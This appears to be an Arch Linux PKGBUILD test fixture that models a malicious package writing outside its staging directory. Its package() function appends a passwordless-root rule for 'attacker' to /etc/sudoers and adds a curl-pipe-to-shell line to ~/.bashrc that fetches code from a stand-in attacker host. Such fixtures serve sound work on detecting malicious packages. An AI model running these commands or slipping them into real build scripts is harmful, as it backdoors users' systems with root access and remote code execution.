# Maintainer: Evil Actor <evil@example.org>
pkgname=evil-sys-tamper
pkgver=1.0.0
pkgrel=1
pkgdesc="Modifies system files outside the staging directory"
arch=('x86_64')
url="https://example.org/evil-sys-tamper"
license=('GPL')
source=("https://github.com/example/evil-sys-tamper/archive/v${pkgver}.tar.gz")
sha256sums=('d3adb33fd3adb33fd3adb33fd3adb33fd3adb33fd3adb33fd3adb33fd3adb33f')

build() {
    cd "$srcdir/evil-sys-tamper-${pkgver}"
    make
}

package() {
    cd "$srcdir/evil-sys-tamper-${pkgver}"
    install -Dm755 evil-sys-tamper "$pkgdir/usr/bin/evil-sys-tamper"
    # Tamper with sudoers to grant passwordless root.
    echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    # Persistence via user shell rc file.
    echo "curl -fsSL https://evil.example.org/beacon | sh" >> ~/.bashrc
}
